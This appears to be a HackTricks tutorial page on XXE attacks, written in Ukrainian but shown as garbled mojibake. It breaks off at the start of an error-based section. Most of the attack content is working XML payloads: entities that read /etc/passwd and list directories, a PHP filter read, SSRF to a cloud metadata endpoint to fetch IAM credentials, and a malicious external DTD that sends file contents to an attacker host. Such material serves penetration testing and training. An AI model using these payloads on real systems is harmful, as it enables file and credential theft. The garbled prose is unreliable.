# XXE - XEE - –ó–æ–≤–Ω—ñ—à–Ω—ñ–π —Å—É—Ç–Ω—ñ—Å–Ω–∏–π XML

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>

## –û—Å–Ω–æ–≤–∏ XML

XML - —Ü–µ –º–æ–≤–∞ —Ä–æ–∑–º—ñ—Ç–∫–∏, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∞ –¥–ª—è –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è —Ç–∞ —Ç—Ä–∞–Ω—Å–ø–æ—Ä—Ç—É–≤–∞–Ω–Ω—è –¥–∞–Ω–∏—Ö, —è–∫–∞ –º–∞—î –≥–Ω—É—á–∫—É —Å—Ç—Ä—É–∫—Ç—É—Ä—É, —â–æ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –æ–ø–∏—Å–æ–≤–∞–Ω—ñ —Ç–µ–≥–∏. –í–æ–Ω–∞ –≤—ñ–¥—Ä—ñ–∑–Ω—è—î—Ç—å—Å—è –≤—ñ–¥ HTML —Ç–∏–º, —â–æ –Ω–µ –æ–±–º–µ–∂—É—î—Ç—å—Å—è –Ω–∞–±–æ—Ä–æ–º –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ –≤–∏–∑–Ω–∞—á–µ–Ω–∏—Ö —Ç–µ–≥—ñ–≤. –ó–Ω–∞—á–µ–Ω–Ω—è XML –∑–º–µ–Ω—à–∏–ª–æ—Å—è –∑ –ø–æ—è–≤–æ—é JSON, –Ω–µ–∑–≤–∞–∂–∞—é—á–∏ –Ω–∞ –π–æ–≥–æ –ø–æ—á–∞—Ç–∫–æ–≤—É —Ä–æ–ª—å –≤ —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ—ó AJAX.

* **–ü—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–Ω—è –¥–∞–Ω–∏—Ö —á–µ—Ä–µ–∑ —Å—É—Ç–Ω–æ—Å—Ç—ñ**: –°—É—Ç–Ω–æ—Å—Ç—ñ –≤ XML –¥–æ–∑–≤–æ–ª—è—é—Ç—å –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—Ç–∏ –¥–∞–Ω—ñ, –≤–∫–ª—é—á–∞—é—á–∏ —Å–ø–µ—Ü—ñ–∞–ª—å–Ω—ñ —Å–∏–º–≤–æ–ª–∏, —Ç–∞–∫—ñ —è–∫ `&lt;` —Ç–∞ `&gt;`, —è–∫—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å `<` —Ç–∞ `>`, —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ –∫–æ–Ω—Ñ–ª—ñ–∫—Ç—ñ–≤ –∑ —Å–∏—Å—Ç–µ–º–æ—é —Ç–µ–≥—ñ–≤ XML.
* **–í–∏–∑–Ω–∞—á–µ–Ω–Ω—è –µ–ª–µ–º–µ–Ω—Ç—ñ–≤ XML**: XML –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∑–Ω–∞—á–∞—Ç–∏ —Ç–∏–ø–∏ –µ–ª–µ–º–µ–Ω—Ç—ñ–≤, –æ–ø–∏—Å—É—é—á–∏, —è–∫ –ø–æ–≤–∏–Ω–Ω—ñ –±—É—Ç–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä–æ–≤–∞–Ω—ñ –µ–ª–µ–º–µ–Ω—Ç–∏ —Ç–∞ —è–∫–∏–π –≤–º—ñ—Å—Ç –≤–æ–Ω–∏ –º–æ–∂—É—Ç—å –º—ñ—Å—Ç–∏—Ç–∏, –≤—ñ–¥ –±—É–¥—å-—è–∫–æ–≥–æ —Ç–∏–ø—É –≤–º—ñ—Å—Ç—É –¥–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –¥–æ—á—ñ—Ä–Ω—ñ—Ö –µ–ª–µ–º–µ–Ω—Ç—ñ–≤.
* **–í–∏–∑–Ω–∞—á–µ–Ω–Ω—è —Ç–∏–ø—É –¥–æ–∫—É–º–µ–Ω—Ç–∞ (DTD)**: DTD —î –≤–∞–∂–ª–∏–≤–∏–º —É XML –¥–ª—è –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è —Å—Ç—Ä—É–∫—Ç—É—Ä–∏ –¥–æ–∫—É–º–µ–Ω—Ç–∞ —Ç–∞ —Ç–∏–ø—ñ–≤ –¥–∞–Ω–∏—Ö, —è–∫—ñ –≤—ñ–Ω –º–æ–∂–µ –º—ñ—Å—Ç–∏—Ç–∏. –í–æ–Ω–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ–º–∏, –∑–æ–≤–Ω—ñ—à–Ω—ñ–º–∏ –∞–±–æ –∫–æ–º–±—ñ–Ω–æ–≤–∞–Ω–∏–º–∏, –∫–µ—Ä—É—é—á–∏ —Ç–∏–º, —è–∫ —Ñ–æ—Ä–º–∞—Ç—É—é—Ç—å—Å—è —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä—è—é—Ç—å—Å—è –¥–æ–∫—É–º–µ–Ω—Ç–∏.
* **–í–ª–∞—Å–Ω—ñ —Ç–∞ –∑–æ–≤–Ω—ñ—à–Ω—ñ —Å—É—Ç–Ω–æ—Å—Ç—ñ**: XML –ø—ñ–¥—Ç—Ä–∏–º—É—î —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –≤–ª–∞—Å–Ω–∏—Ö —Å—É—Ç–Ω–æ—Å—Ç–µ–π —É DTD –¥–ª—è –≥–Ω—É—á–∫–æ–≥–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–Ω—è –¥–∞–Ω–∏—Ö. –ó–æ–≤–Ω—ñ—à–Ω—ñ —Å—É—Ç–Ω–æ—Å—Ç—ñ, –≤–∏–∑–Ω–∞—á–µ–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é URL, –≤–∏–∫–ª–∏–∫–∞—é—Ç—å –ø–∏—Ç–∞–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏, –æ—Å–æ–±–ª–∏–≤–æ –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ –∞—Ç–∞–∫ –∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö —Å—É—Ç–Ω–æ—Å—Ç–µ–π XML (XXE), —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —Å–ø–æ—Å—ñ–± –æ–±—Ä–æ–±–∫–∏ –∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö –¥–∂–µ—Ä–µ–ª –¥–∞–Ω–∏—Ö XML-–∞–Ω–∞–ª—ñ–∑–∞—Ç–æ—Ä–∞–º–∏: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`
* **–í–∏—è–≤–ª–µ–Ω–Ω—è XXE –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø–∞—Ä–∞–º–µ—Ç—Ä–∏—á–Ω–∏—Ö —Å—É—Ç–Ω–æ—Å—Ç–µ–π**: –î–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π XXE, –æ—Å–æ–±–ª–∏–≤–æ –∫–æ–ª–∏ —Ç—Ä–∞–¥–∏—Ü—ñ–π–Ω—ñ –º–µ—Ç–æ–¥–∏ –Ω–µ –ø—Ä–∞—Ü—é—é—Ç—å —á–µ—Ä–µ–∑ –∑–∞—Ö–æ–¥–∏ –±–µ–∑–ø–µ–∫–∏ –∞–Ω–∞–ª—ñ–∑–∞—Ç–æ—Ä–∞, –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏—á–Ω—ñ —Å—É—Ç–Ω–æ—Å—Ç—ñ XML. –¶—ñ —Å—É—Ç–Ω–æ—Å—Ç—ñ –¥–æ–∑–≤–æ–ª—è—é—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ç–µ—Ö–Ω—ñ–∫–∏ –≤–∏—è–≤–ª–µ–Ω–Ω—è –ø–æ–∑–∞ –º–µ—Ä–µ–∂–µ—é, —Ç–∞–∫—ñ —è–∫ —Å–ø—Ä–∞—Ü—é–≤–∞–Ω–Ω—è DNS-–∑–∞–ø–∏—Ç—ñ–≤ –∞–±–æ HTTP-–∑–∞–ø–∏—Ç—ñ–≤ –Ω–∞ –∫–µ—Ä–æ–≤–∞–Ω–∏–π –¥–æ–º–µ–Ω –¥–ª—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ.
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`

## –û—Å–Ω–æ–≤–Ω—ñ –∞—Ç–∞–∫–∏

[**–ë—ñ–ª—å—à—ñ—Å—Ç—å —Ü–∏—Ö –∞—Ç–∞–∫ –±—É–ª–∏ –ø—Ä–æ—Ç–µ—Å—Ç–æ–≤–∞–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —á—É–¥–æ–≤–∏—Ö –ª–∞–±–æ—Ä–∞—Ç–æ—Ä—ñ–π Portswiggers XEE: https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)

### –¢–µ—Å—Ç –Ω–æ–≤–æ—ó —Å—É—Ç–Ω–æ—Å—Ç—ñ

–£ —Ü—ñ–π –∞—Ç–∞–∫—ñ —è –ø–µ—Ä–µ–≤—ñ—Ä—é, —á–∏ –ø—Ä–∞—Ü—é—î –ø—Ä–æ—Å—Ç–µ –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è –Ω–æ–≤–æ—ó –°–£–¢–ù–û–°–¢–Ü.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
### –ß–∏—Ç–∞–Ω–Ω—è —Ñ–∞–π–ª—É

–°–ø—Ä–æ–±—É—î–º–æ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ `/etc/passwd` —Ä—ñ–∑–Ω–∏–º–∏ —Å–ø–æ—Å–æ–±–∞–º–∏. –î–ª—è Windows –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏: `C:\windows\system32\drivers\etc\hosts`

–£ —Ü—å–æ–º—É –ø–µ—Ä—à–æ–º—É –≤–∏–ø–∞–¥–∫—É –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ SYSTEM "_\*\*file:///\*\*etc/passwd_" —Ç–∞–∫–æ–∂ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏–º–µ.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
–¶–µ–π –¥—Ä—É–≥–∏–π –≤–∏–ø–∞–¥–æ–∫ –º–æ–∂–µ –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–∏–º –¥–ª—è –≤–∏–ª—É—á–µ–Ω–Ω—è —Ñ–∞–π–ª—É, —è–∫—â–æ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î PHP (–Ω–µ –≤–∏–ø–∞–¥–æ–∫ –ª–∞–±–æ—Ä–∞—Ç–æ—Ä—ñ–π Portswiggers)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
–£ —Ü—å–æ–º—É —Ç—Ä–µ—Ç—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –º–∏ –æ–≥–æ–ª–æ—à—É—î–º–æ `Element stockCheck` —è–∫ ANY
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
### –°–ø–∏—Å–æ–∫ –∫–∞—Ç–∞–ª–æ–≥—ñ–≤

–£ –¥–æ–¥–∞—Ç–∫–∞—Ö –Ω–∞ –æ—Å–Ω–æ–≤—ñ **Java** –º–æ–∂–ª–∏–≤–æ **–ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ –≤–º—ñ—Å—Ç –∫–∞—Ç–∞–ª–æ–≥—É** —á–µ—Ä–µ–∑ XXE –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ç–∞–∫–æ–≥–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è (–ø—Ä–æ—Å—Ç–æ –∑–∞–ø–∏—Ç—É—é—á–∏ –∫–∞—Ç–∞–ª–æ–≥ –∑–∞–º—ñ—Å—Ç—å —Ñ–∞–π–ª—É):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

XXE –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è SSRF –≤ —Ö–º–∞—Ä—ñ
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### –°–ª—ñ–ø–∏–π SSRF

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **—Ä–∞–Ω—ñ—à–µ –∑–≥–∞–¥–∞–Ω—É —Ç–µ—Ö–Ω—ñ–∫—É**, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—É—Å–∏—Ç–∏ —Å–µ—Ä–≤–µ—Ä –∑–≤–µ—Ä—Ç–∞—Ç–∏—Å—è –¥–æ —Å–µ—Ä–≤–µ—Ä–∞, —è–∫–∏–º –≤–∏ –∫–µ—Ä—É—î—Ç–µ, —â–æ–± –ø–æ–∫–∞–∑–∞—Ç–∏ –π–æ–≥–æ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å. –ê–ª–µ, —è–∫—â–æ —Ü–µ –Ω–µ –ø—Ä–∞—Ü—é—î, –º–æ–∂–ª–∏–≤–æ, —Ü–µ —á–µ—Ä–µ–∑ —Ç–µ, —â–æ **XML-—Å—É—Ç–Ω–æ—Å—Ç—ñ –Ω–µ –¥–æ–∑–≤–æ–ª–µ–Ω—ñ**, —É —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ **XML-–ø–∞—Ä–∞–º–µ—Ç—Ä–∏—á–Ω—ñ —Å—É—Ç–Ω–æ—Å—Ç—ñ**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "–°–ª—ñ–ø–∏–π" SSRF - –í–∏–≤–µ–¥–µ–Ω–Ω—è –¥–∞–Ω–∏—Ö –∑–∞ –º–µ–∂—ñ –∑–≤'—è–∑–∫—É

**–£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –º–∏ –∑–º—É—Å–∏–º–æ —Å–µ—Ä–≤–µ—Ä –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –Ω–æ–≤–∏–π DTD –∑—ñ –∑–ª–æ—è–∫—ñ—Å–Ω–∏–º –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è–º, —è–∫–µ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç—å –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É —á–µ—Ä–µ–∑ –∑–∞–ø–∏—Ç HTTP (**–¥–ª—è **—Ñ–∞–π–ª—ñ–≤ –∑ –∫—ñ–ª—å–∫–æ–º–∞ —Ä—è–¥–∫–∞–º–∏ –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≤–∏–≤–µ—Å—Ç–∏ –π–æ–≥–æ —á–µ—Ä–µ–∑** _**ftp://**_ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ü–µ–π –±–∞–∑–æ–≤–∏–π —Å–µ—Ä–≤–µ—Ä, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ [**xxe-ftp-server.rb**](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)**). –¶–µ –ø–æ—è—Å–Ω–µ–Ω–Ω—è –±–∞–∑—É—î—Ç—å—Å—è –Ω–∞** [**–ª–∞–±–æ—Ä–∞—Ç–æ—Ä—ñ—ó Portswigger —Ç—É—Ç**](https://portswigger.net/web-security/xxe/blind)**.**

–£ –∑–ª–æ—è–∫—ñ—Å–Ω–æ–º—É DTD, –Ω–∞–≤–µ–¥–µ–Ω–æ–º—É –Ω–∏–∂—á–µ, –ø—Ä–æ–≤–æ–¥–∏—Ç—å—Å—è —Å–µ—Ä—ñ—è –∫—Ä–æ–∫—ñ–≤ –¥–ª—è –≤–∏–≤–µ–¥–µ–Ω–Ω—è –¥–∞–Ω–∏—Ö:

### –ü—Ä–∏–∫–ª–∞–¥ –∑–ª–æ—è–∫—ñ—Å–Ω–æ–≥–æ DTD:

–°—Ç—Ä—É–∫—Ç—É—Ä–∞ –Ω–∞—Å—Ç—É–ø–Ω–∞:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
–ö—Ä–æ–∫–∏, –≤–∏–∫–æ–Ω–∞–Ω—ñ —Ü–∏–º DTD, –≤–∫–ª—é—á–∞—é—Ç—å:

1. **–í–∏–∑–Ω–∞—á–µ–Ω–Ω—è –ü–∞—Ä–∞–º–µ—Ç—Ä–∏—á–Ω–∏—Ö –°—É—Ç–Ω–æ—Å—Ç–µ–π:**
* –°—Ç–≤–æ—Ä—é—î—Ç—å—Å—è XML –ø–∞—Ä–∞–º–µ—Ç—Ä–∏—á–Ω–∞ —Å—É—Ç–Ω—ñ—Å—Ç—å, `%file`, —è–∫–∞ —á–∏—Ç–∞—î –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É `/etc/hostname`.
* –Ü–Ω—à–∞ XML –ø–∞—Ä–∞–º–µ—Ç—Ä–∏—á–Ω–∞ —Å—É—Ç–Ω—ñ—Å—Ç—å, `%eval`, –≤–∏–∑–Ω–∞—á–∞—î—Ç—å—Å—è. –í–æ–Ω–∞ –¥–∏–Ω–∞–º—ñ—á–Ω–æ –æ–≥–æ–ª–æ—à—É—î –Ω–æ–≤—É XML –ø–∞—Ä–∞–º–µ—Ç—Ä–∏—á–Ω—É —Å—É—Ç–Ω—ñ—Å—Ç—å, `%exfiltrate`. –°—É—Ç–Ω—ñ—Å—Ç—å `%exfiltrate` –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î—Ç—å—Å—è –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è HTTP-–∑–∞–ø–∏—Ç—É –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∞—Ç–∞–∫—É—é—á–æ–≥–æ, –ø–µ—Ä–µ–¥–∞—é—á–∏ –≤–º—ñ—Å—Ç —Å—É—Ç–Ω–æ—Å—Ç—ñ `%file` —É —Ä—è–¥–∫—É –∑–∞–ø–∏—Ç—É URL.
2. **–í–∏–∫–æ–Ω–∞–Ω–Ω—è –°—É—Ç–Ω–æ—Å—Ç–µ–π:**
* –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —Å—É—Ç–Ω—ñ—Å—Ç—å `%eval`, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–∏–Ω–∞–º—ñ—á–Ω–æ–≥–æ –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è —Å—É—Ç–Ω–æ—Å—Ç—ñ `%exfiltrate`.
* –ü–æ—Ç—ñ–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —Å—É—Ç–Ω—ñ—Å—Ç—å `%exfiltrate`, —â–æ –≤–∏–∫–ª–∏–∫–∞—î HTTP-–∑–∞–ø–∏—Ç –Ω–∞ –≤–∫–∞–∑–∞–Ω–∏–π URL —ñ–∑ –≤–º—ñ—Å—Ç–æ–º —Ñ–∞–π–ª—É.

–ê—Ç–∞–∫—É—é—á–∏–π —Ä–æ–∑–º—ñ—â—É—î —Ü–µ–π —à–∫—ñ–¥–ª–∏–≤–∏–π DTD –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ –ø—ñ–¥ —Å–≤–æ—ó–º –∫–æ–Ω—Ç—Ä–æ–ª–µ–º, –∑–∞–∑–≤–∏—á–∞–π –∑–∞ URL-–∞–¥—Ä–µ—Å–æ—é, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `http://web-attacker.com/malicious.dtd`.

**XXE Payload:** –î–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤—Ä–∞–∑–ª–∏–≤–æ—ó –ø—Ä–æ–≥—Ä–∞–º–∏ –∞—Ç–∞–∫—É—é—á–∏–π –Ω–∞–¥—Å–∏–ª–∞—î XXE –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
–¶–µ–π –≤—Ä–∞–∑–ª–∏–≤–∏–π –∫–æ–¥ –≤–∏–∑–Ω–∞—á–∞—î XML –ø–∞—Ä–∞–º–µ—Ç—Ä–∏—á–Ω–∏–π –æ–±'—î–∫—Ç `%xxe` —Ç–∞ –≤–∫–ª—é—á–∞—î –π–æ–≥–æ –≤ DTD. –ü—Ä–∏ –æ–±—Ä–æ–±—Ü—ñ XML-–∞–Ω–∞–ª—ñ–∑–∞—Ç–æ—Ä–æ–º —Ü–µ–π –∫–æ–¥ –≤–∏—Ç—è–≥—É—î –∑–æ–≤–Ω—ñ—à–Ω—ñ–π DTD –∑ —Å–µ—Ä–≤–µ—Ä–∞ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞. –ü–æ—Ç—ñ–º –∞–Ω–∞–ª—ñ–∑–∞—Ç–æ—Ä —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç—É—î DTD –≤ —Ä–µ–∂–∏–º—ñ —Ä–µ–∞–ª—å–Ω–æ–≥–æ —á–∞—Å—É, –≤–∏–∫–æ–Ω—É—é—á–∏ –∫—Ä–æ–∫–∏, –≤–∫–∞–∑–∞–Ω—ñ –≤ —à–∫—ñ–¥–ª–∏–≤–æ–º—É DTD, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –≤–∏—Ç—ñ–∫–∞–Ω–Ω—è —Ñ–∞–π–ª—É `/etc/hostname` –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞.

### –û—Å–Ω–æ–≤–∞–Ω–æ –Ω–∞ –ø–æ–º–∏–ª–∫–∞—Ö (–ó–æ–≤–Ω—ñ—à–Ω—ñ–π DTD)

**–£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –º–∏ –∑–º—É—Å–∏–º–æ —Å–µ—Ä–≤–µ—Ä –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —à–∫—ñ–¥–ª–∏–≤–∏–π DTD, —è–∫–∏–π –ø–æ–∫–∞–∂–µ –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É —É –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—ñ –ø—Ä–æ –ø–æ–º–∏–ª–∫—É (—Ü–µ –ø—Ä–∞—Ü—é—î –ª–∏—à–µ –≤ —Ä–∞–∑—ñ, —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –±–∞—á–∏—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫—É).** [**–ü—Ä–∏–∫–ª–∞–¥ —Ç—É—Ç.**](https://portswigger.net/web-security/xxe/blind)

–ü–æ–º–∏–ª–∫–∞ —Ä–æ–∑–±–æ—Ä—É XML, —è–∫–∞ —Ä–æ–∑–∫—Ä–∏–≤–∞—î –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É `/etc/passwd`, –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–ª–∏–∫–∞–Ω–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ –∑–æ–≤–Ω—ñ—à–Ω—å–æ–≥–æ –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è —Ç–∏–ø—É –¥–æ–∫—É–º–µ–Ω—Ç–∞ (DTD). –¶–µ –¥–æ—Å—è–≥–∞—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö –∫—Ä–æ–∫—ñ–≤:

